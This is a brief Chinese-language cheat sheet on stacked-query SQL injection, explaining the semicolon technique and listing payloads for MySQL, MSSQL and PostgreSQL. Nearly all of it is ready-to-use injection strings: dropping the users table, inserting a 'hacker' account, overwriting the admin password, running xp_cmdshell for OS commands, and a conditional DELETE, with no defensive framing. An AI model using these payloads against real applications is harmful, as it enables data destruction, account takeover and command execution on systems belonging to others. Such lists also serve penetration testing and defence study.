# 堆叠查询注入

## 1. 原理

使用分号(;)分隔多条SQL语句

## 2. MySQL堆叠

```sql
'; DROP TABLE users;--
'; INSERT INTO users (username,password) VALUES ('hacker','123456');--
'; UPDATE users SET password='hacked' WHERE username='admin';--
```

## 3. MSSQL堆叠

```sql
'; exec xp_cmdshell 'whoami';--
'; sp_executesql 'SELECT * FROM users';--
```

## 4. PostgreSQL堆叠

```sql
'; DROP TABLE users;--
'; CREATE TABLE hacker(id INT);--
```

## 5. 条件触发

```sql
'; IF(1=1,SELECT 1,DELETE FROM users)--
```

## 6. 注意事项

- MySQL默认不支持堆叠查询
- MSSQL和PostgreSQL支持
- 需要多语句支持
